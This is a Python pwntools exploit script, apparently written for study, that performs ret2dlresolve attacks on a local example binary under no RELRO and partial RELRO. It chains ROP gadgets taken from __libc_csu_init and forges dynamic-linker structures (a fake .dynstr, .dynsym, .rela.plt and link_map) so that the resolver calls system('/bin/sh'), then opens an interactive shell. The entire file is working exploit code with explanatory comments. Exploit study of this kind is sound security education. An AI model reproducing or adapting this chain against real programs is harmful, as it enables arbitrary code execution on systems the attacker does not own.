import sys
import pwn

def usage():
	print('----------------------------------------------------')
	print('| python ./exploit.py [option]                     |')
	print('| options:                                         |')
	print('| n: bypass no relro                               |')
	print('| pn: bypass partial relro for normal lookup       |')
	print('| ps: bypass partial relro for specific lookup     |')
	print('----------------------------------------------------')

def arg_check(arg):
	print('[--] tips: arg = {0}'.format(arg))
	if arg != 'n' and arg != 'pn' and arg != 'ps':
		return -1
	return 0

def usage_error():
	print('[--] tips: incorrect usage')
	usage()
	exit()

def dynamic_ele_offset_get_by_tag(tag_name):
	dynamic_info = target_info['exec_info'].get_section_by_name('.dynamic')
	dynamic_addr = target_info['exec_info'].get_section_by_name('.dynamic').header.sh_addr
	dyn_ele_index = 0
	for t in dynamic_info.iter_tags():
		if t.entry.d_tag == tag_name:
			break
		dyn_ele_index = dyn_ele_index + 1
	dyn_ele_size = 0x10 # Elf64_Dyn size
	dynstr_in_dynamic  = dynamic_addr + dyn_ele_index * dyn_ele_size
	return dynstr_in_dynamic

'''
rop chain by csu [pop -> call -> pop -> ret]:
	csu_pop_ret (pop rbx, rbp, r12. r13. r14, r15)
	data for csu_pop_ret->pop
	address for csu_pop_ret->ret, address should be csu_call_reg
		csu_call_reg: rdi=r12 ; rsi=r13 ; rdx=r14 ; jump to [r15+8*rbx]
	after csu_call_reg, will do csu_pop_ret again (if rbx+1 != rbp ; jump to [csu_call_reg])
	data for csu_pop_ret->pop
	address for csu_pop_ret->ret
'''

def csu_rop_chain_get(
	r12_arg1, r13_arg2, r14_arg3, r15_call_addr_base,
	rbx_call_addr_append, rbp_val, ret_addr
):
	payload = pwn.p64(target_info['csu_pop_ret'])
	payload += pwn.p64(rbx_call_addr_append)
	payload += pwn.p64(rbp_val)
	payload += pwn.p64(r12_arg1)
	payload += pwn.p64(r13_arg2)
	payload += pwn.p64(r14_arg3)
	payload += pwn.p64(r15_call_addr_base)
	payload += pwn.p64(target_info['csu_call_reg'])
	payload += b'\x00' * target_info['addr_len']	# fix [add $0x8,%rsp]
	payload += b'\x00' * (target_info['csu_pop_all_count'] * target_info['addr_len'])
	payload += pwn.p64(ret_addr)
	return payload

'''
| buffer  | caller rbp | callee return |
| padding | padding    | csu_rop_chain |
'''

def rop_chain4dynstr_ptr_in_dynamic_modify_get():
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], dynamic_ele_offset_get_by_tag('DT_STRTAB') + target_info['addr_len'],
		target_info['addr_len'], target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

def rop_chain4fake_dynstr_fill(data_len):
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], target_info['fake_addr'],
		data_len, target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

def rop_chain4func_args_fill(func_args_addr, data_len):
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], func_args_addr,
		data_len, target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

def rop_chain4dl_resollve_start(func_args_addr):
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += pwn.p64(target_info['csu_pop_rsi_r15_ret'])
	payload += pwn.p64(0)
	payload += pwn.p64(0)
	payload += pwn.p64(target_info['csu_pop_rdi_ret'])
	payload += pwn.p64(func_args_addr)
	payload += pwn.p64(target_info['exec_info'].symbols['read'] + 0x6)	# add 0x6, goto the second instruction of read@plt
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

'''
stage one   -> modify the .dynstr address recorded in .dynamic to address [fake_addr]
stage two   -> create fake .dynstr and fill it into address [fake_addr]
stage three -> set the args required by the function to address [fake_addr + fake .dynstr len]
stage four  -> jump to read@plt [1], When _dl_resolve is running, [fake function] will be obtained instead of [read]
'''

def pwn4norelro():
	payload_1 = rop_chain4dynstr_ptr_in_dynamic_modify_get()
	conn.send(payload_1)
	data4payload_1 = pwn.p64(target_info['fake_addr'])
	conn.send(data4payload_1)

	dynstr_orig = target_info['exec_info'].get_section_by_name('.dynstr').data()
	fake_dynstr4payload_2 = dynstr_orig.replace(b'read', b'system')
	payload_2 = rop_chain4fake_dynstr_fill(len(fake_dynstr4payload_2))
	conn.send(payload_2)
	conn.send(fake_dynstr4payload_2)

	func_args_addr = target_info['fake_addr'] + len(fake_dynstr4payload_2)
	args4payload_3 = b'/bin/sh\x00'
	payload_3 = rop_chain4func_args_fill(func_args_addr, len(args4payload_3))
	conn.send(payload_3)
	conn.send(args4payload_3)

	payload_4 = rop_chain4dl_resollve_start(func_args_addr)
	conn.send(payload_4)

def fake_rela_plt_get(pre_data_len, sym_index4fake_dynsym):
	real_rela_plt_addr = target_info['exec_info'].get_section_by_name('.rela.plt').header.sh_addr
	one_rela_size = target_info['exec_info'].dynamic_value_by_tag('DT_RELAENT')
	reslove_addr = target_info['exec_info'].got['write']
	ELF_MACHINE_JMP_SLOT_val = 0x7

	fake_rela_plt_addr = target_info['fake_addr'] + pre_data_len
	fake2real_offset = fake_rela_plt_addr - real_rela_plt_addr
	pad = one_rela_size - fake2real_offset % one_rela_size
	fake_rela_plt_addr = fake_rela_plt_addr + pad
	fake2real_offset = fake_rela_plt_addr - real_rela_plt_addr
	rela_index4fake_rela_plt = fake2real_offset / one_rela_size

	fake_data = b'\x00' * pad
	fake_data += pwn.p64(reslove_addr)												# r_offset
	fake_data += pwn.p64((sym_index4fake_dynsym << 32) | ELF_MACHINE_JMP_SLOT_val)	# r_info
	fake_data += pwn.p64(0)															# r_addend
	return fake_data, int(rela_index4fake_rela_plt)

def fake_dynsym_get(pre_data_len, str_index4fake_dynstr):
	real_dynsym_addr = target_info['exec_info'].get_section_by_name('.dynsym').header.sh_addr
	one_symtab_size = target_info['exec_info'].dynamic_value_by_tag('DT_SYMENT')

	fake_dynsym_addr = target_info['fake_addr'] + pre_data_len
	fake2real_offset = fake_dynsym_addr - real_dynsym_addr
	pad = one_symtab_size - fake2real_offset % one_symtab_size
	fake_dynsym_addr = fake_dynsym_addr + pad
	fake2real_offset = fake_dynsym_addr - real_dynsym_addr
	sym_index4fake_dynsym = fake2real_offset / one_symtab_size

	fake_data = b'\x00' * pad
	fake_data += pwn.p32(str_index4fake_dynstr)		# st_name
	fake_data += pwn.p8(0x18)						# st_info, st_info -> bind, type, 0x18 -> STB_GLOBAL, STT_FUNC
	fake_data += pwn.p8(0)							# st_other
	fake_data += pwn.p16(0)							# st_shndx
	fake_data += pwn.p64(0)							# st_value
	fake_data += pwn.p64(0)							# st_size
	return fake_data, int(sym_index4fake_dynsym)

def fake_dynstr_get():
	real_dynstr_addr = target_info['exec_info'].get_section_by_name('.dynstr').header.sh_addr
	one_symtab_size = target_info['exec_info'].dynamic_value_by_tag('DT_SYMENT')

	str_index4fake_dynstr = target_info['fake_addr'] - real_dynstr_addr

	fake_data = b'system'
	fake_data += b'\x00'
	return fake_data, int(str_index4fake_dynstr)

'''
| fake .dynstr | fake .dynsym | fake .rela.plt | fake function args |

relocation index -> fake .rela.plt -> r_info -> symbol index
symbol index -> fake .dynsym -> st_name -> string index
string index -> fake .dynstr

string -> .dynstr base address + string index
symbol -> .dynsym base address + (symbol index * one symtab size)
rela   -> .rela.plt base address + (rela index * one rela size)

| buffer  | caller rbp | callee return |
| padding | padding    | rop chain     |

rop chain -> read fake data to fake address
'''

def rop_chain4fake_dl_resolve_data_fill():
	fake_dynstr_data, str_index4fake_dynstr = fake_dynstr_get()
	fake_data = fake_dynstr_data

	fake_dynsym_data, sym_index4fake_dynsym = fake_dynsym_get(len(fake_dynstr_data), str_index4fake_dynstr)
	fake_data += fake_dynsym_data

	fake_rela_plt, rela_index4fake_rela_plt = fake_rela_plt_get(len(fake_data), sym_index4fake_dynsym)
	fake_data += fake_rela_plt

	bin_sh_addr = target_info['fake_addr'] + len(fake_data)
	fake_data += b'/bin/sh\x00'

	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], target_info['fake_addr'],
		len(fake_data), target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload, fake_data, bin_sh_addr, rela_index4fake_rela_plt

def rop_chain4link_map_addr_leak():
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdout_fd'], target_info['push_link_map_site'],
		target_info['addr_len'], target_info['exec_info'].got['write'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

def rop_chain4verson4l_info_set2null(link_map_addr):
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], link_map_addr + 0x1c8,
		target_info['addr_len'], target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

'''
| rsp + 0x0      | rsp + 0x8 | rsp + 0x10      |
| func_args_addr | plt0_addr | fake rela index |

pop rdi -> rdi = func_args_addr
ret     -> rip = plt0
	rsp+0x0 -> fake rela index

plt0 push xxxx
	rsp+0x0 -> link_map
	rsp+0x8 -> fake rela index

_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
l = rsp+0x0 ; reloc_arg = rsp+0x8
'''

def rop_chain4dl_resolve_with_normal_lookup_start(func_args_addr, rela_index4fake_rela_plt):
	plt_0 = target_info['exec_info'].get_section_by_name('.plt').header.sh_addr

	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += pwn.p64(target_info['csu_pop_rdi_ret'])
	payload += pwn.p64(func_args_addr)
	payload += pwn.p64(plt_0)
	payload += pwn.p64(rela_index4fake_rela_plt)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

'''
stage one   -> construct [fake data] and fill it to [fake address]
stage two   -> leaked link map address
stage three -> set the version in the link map to be empty
stage four  -> jump to plt [0], When _dl_resolve is running, [fake data] will be used [evil index lead us to fake data]
'''

def pwn4partial_relro_with_normal_lookup():
	payload_1, data4payload_1, bin_sh_addr, rela_index4rela_plt = rop_chain4fake_dl_resolve_data_fill()
	conn.send(payload_1)
	conn.send(data4payload_1)

	payload_2 = rop_chain4link_map_addr_leak()
	conn.send(payload_2)
	leak_data = conn.recv(target_info['addr_len'])
	link_map_addr = pwn.u64(leak_data)
	print('[++] receive: link map address {0}'.format(hex(link_map_addr)))

	payload_3 = rop_chain4verson4l_info_set2null(link_map_addr)
	conn.send(payload_3)
	data4payload_3 = pwn.p64(0)
	conn.send(data4payload_3)

	payload_4 = rop_chain4dl_resolve_with_normal_lookup_start(bin_sh_addr, rela_index4rela_plt)
	conn.send(payload_4)

def rop_chain4fake_link_map_fill(fake_data_len):
	rbx_val = 0
	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	payload += csu_rop_chain_get(
		target_info['stdin_fd'], target_info['fake_addr'],
		fake_data_len, target_info['exec_info'].got['read'],
		rbx_val, rbx_val + 1,
		target_info['exec_info'].symbols['vuln']	# read again
	)
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

def negative2complement(val):
	bits_cnt4one_byte = 0x8
	max_size4complement = 2**(target_info['addr_len'] * bits_cnt4one_byte) - 1	# 0xffffffffffffffff

	val = val & max_size4complement
	return val

'''
_dl_fixup data used ->
	0x68: need an accessible address [addr_a], get STRTAB in .dynamic
	0x70: need an accessible address [addr_b], get SYMTAB in .dynamic
	0xf8: need an accessible address [addr_c], get JMPREL in .dynamic

[addr_b] -> [addr_b] + 0x8 -> get Elf64_Sym [addr_b_1]
	1. get symbol				; *(addr_b_1 + symbol index) = symbol address
	2. get Elf64_Sym.st_other	; *(symbol address + 0x5)

[addr_c] -> [addr_c] + 0x8 -> get Elf64_Rela [addr_c_1]
	1. get Elf64_Rela.r_offset address	; *(addr_c_1 + 0x0)
	2. get Elf64_Rela.r_info address	; *(addr_c_1 + 0x8)
		( bit63 - sym - bit32 ; bit31 - type - bit0 )
		type value should be ELF_MACHINE_JMP_SLOT

other data ->
	store dynamic funcrtion args

if [Elf64_Sym.st_other == 3] -> lookup symbol by known addresses

fake data map info:
| 0x0    | 0x8        | 0x10                         | 0x18     | 0x20   | 0x28 - 0x38 |
| l_addr | for JMPREL | for Elf64_Rela, JMPREL.d_ptr | r_offset | r_info | padding     |

| 0x38       | 0x40                        | 0x48 - 0x68 | 0x68   | 0x70   | 0x78 - 0xf8 | 0xf8   |
| for SYMTAB | for Elf64_Sym, SYMTAB.d_ptr | padding     | STRTAB | SYMTAB | padding     | JMPREL |

add    0x8(%rax),%rdx
	-> rdx = l_addr
	-> 0x8(%rax) = *(rax + 0x8) = pedal function real address

_dl_fixup return value -> l_addr + Elf64_Sym.st_val -> l_addr + *(SYMTAB.d_ptr + 0x8)
	-> l_addr: distance from target to pedal
	-> *(SYMTAB.d_ptr + 0x8) -> *(unknow address) = pedal function real address
		-> unknow address = pedal function .got.plt address
		-> SYMTAB.d_ptr = pedal function .got.plt address - 0x8
'''

def fake_link_map_get():
	plt_0 = target_info['exec_info'].get_section_by_name('.plt').header.sh_addr
	pedal_addr = target_info['libc_info'].sym['read']
	pedal_got_addr = target_info['exec_info'].got['read']
	target2pedal_offset = target_info['libc_info'].sym['system'] - pedal_addr

	ELF_MACHINE_JMP_SLOT_val = 0x7
	addr4STRTAB_offset = 0x0
	addr4JMPREL_offset = 0x8
	addr4Elf64_Rela_offset = 0x18
	addr4SYMTAB_offset = 0x38
	addr4st_other_offset = 0x35

	# 0x0 ; l_addr
	fake_link_map = pwn.p64(negative2complement(target2pedal_offset))
	# 0x8 ; for JMPREL, fake_addr + 0x8 + relocation index (0) = fake_addr + 0x8
	fake_link_map += pwn.p64(0)
	# 0x10 ; for Elf64_Rela, JMPREL.d_ptr
	fake_link_map += pwn.p64(target_info['fake_addr'] + addr4Elf64_Rela_offset)
	# 0x18 ; for r_offset
	fake_link_map += pwn.p64(negative2complement(target_info['fake_addr'] + 0x30 - target2pedal_offset))
	# 0x20 ; for r_info
	fake_link_map += pwn.p64(ELF_MACHINE_JMP_SLOT_val)	# sym (symbol index) is 0x0
	# 0x28 - 0x38 ; padding
	fake_link_map += b'A' * 0x10
	# 0x38 ; for SYMTAB, fake_addr + 0x38 + symbol index (0) = fake_addr + 0x38
	fake_link_map += pwn.p64(0)
	# 0x40 ; for Elf64_Sym, SYMTAB.d_ptr
	fake_link_map += pwn.p64(pedal_got_addr - target_info['addr_len'])
	# 0x48 - 0x68
	fake_link_map += b'/bin/sh\x00'
	fake_link_map += b'B' * 0x18
	# 0x68 ; STRTAB
	fake_link_map += pwn.p64(target_info['fake_addr'] + addr4STRTAB_offset)
	# 0x70 ; SYMTAB
	fake_link_map += pwn.p64(target_info['fake_addr'] + addr4SYMTAB_offset)
	# 0x78 - 0xf8 ; padding
	fake_link_map += b'C' * 0x80
	# 0xf8 ; JMPREL
	fake_link_map += pwn.p64(target_info['fake_addr'] + addr4JMPREL_offset)
	return fake_link_map

'''
after [pop rdi ; ret] ->
	rsp + 0x0: fake link map address
	rsp + 0x8: relocation index

enter _dl_runtime_resolve_fxsave ->
	push   %rbx			# rsp + 0x0 = rbx ; rsp + 0x8 = fake link map address ; rsp + 0x10 = relocation index
	mov    %rsp,%rbx
	......
	mov    0x10(%rbx),%rsi
	mov    0x8(%rbx),%rdi
	call   0x7ffff7fd6ff0 <_dl_fixup>

_dl_fixup(arg1, arg2) ->
	arg1 = rsp + 0x8 ; arg2 = rsp + 0x10
'''

def rop_chain4dl_resolve_with_specific_lookup_start():
	plt_0 = target_info['exec_info'].get_section_by_name('.plt').header.sh_addr
	plt_02second_instruction = 0x6
	arg1_address = target_info['fake_addr'] + 0x48

	payload = b'A' * target_info['buf2ver']
	payload += b'B' * target_info['addr_len']
	# align the rsp to 0x10
	payload += pwn.p64(target_info['csu_pop_rsi_r15_ret'])
	payload += pwn.p64(0)
	payload += pwn.p64(0)
	# set dynamic function args and dl resolve address
	payload += pwn.p64(target_info['csu_pop_rdi_ret'])
	payload += pwn.p64(arg1_address)
	payload += pwn.p64(plt_0 + plt_02second_instruction)
	# set _dl_fixup() args
	payload += pwn.p64(target_info['fake_addr'])				# fake link_map address
	payload += pwn.p64(0)										# relocation index
	payload += b'\x00' * (target_info['setbuf_size'] - len(payload))
	return payload

'''
stage one   -> construct [fake data] as the new [link map]
stage two   -> fill [fake data] to [fake address]
stage three -> jump to plt [0] [1]
'''

def pwn4partial_relro_with_specific_lookup():
	fake_link_map = fake_link_map_get()
	payload_1 = rop_chain4fake_link_map_fill(len(fake_link_map))
	conn.send(payload_1)
	conn.send(fake_link_map)

	payload_2 = rop_chain4dl_resolve_with_specific_lookup_start()
	conn.send(payload_2)

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

target_info = {
	'exec_path': './ret2dlresolve_example',
	'exec_mode': '-',
	'exec_info': None,
	'libc_info': None,
	'addr_len': 0x8,
	'buf2ver': 0x70,
	'setbuf_size': 0x100,
	'csu_pop_ret': 0x401242,
	'csu_call_reg': 0x401228,
	'csu_pop_rsi_r15_ret': 0x401249,
	'csu_pop_rdi_ret': 0x40124b,
	'csu_pop_all_count': 0x6,
	'stdin_fd': 0x0,
	'stdout_fd': 0x1,
	'fake_addr': 0x0,
	'push_link_map_site': 0x403ff0,
}

if len(sys.argv) != 2 or arg_check(sys.argv[1]) != 0:
	usage_error()

target_info['exec_mode'] = sys.argv[1]
print('[--] tips: current mode = {0}'.format(target_info['exec_mode']))

if target_info['exec_mode'] == 'n':
	mode_suffix = 'NoRelRO'
	pwnfunc = pwn4norelro
elif target_info['exec_mode'] == 'pn':
	mode_suffix = 'PartialRelRO'
	pwnfunc = pwn4partial_relro_with_normal_lookup
elif target_info['exec_mode'] == 'ps':
	mode_suffix = 'PartialRelRO'
	pwnfunc = pwn4partial_relro_with_specific_lookup
else:
	usage_error()

target_info['exec_path'] = target_info['exec_path'] + '_' + mode_suffix
target_info['exec_info'] = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = target_info['exec_info'].libc

fake_addr2bss_bias = 0x100
target_info['fake_addr'] = target_info['exec_info'].bss() + fake_addr2bss_bias

conn = pwn.process(target_info['exec_path'])

conn.recvuntil(b'hello world\n')
pwnfunc()
conn.interactive()
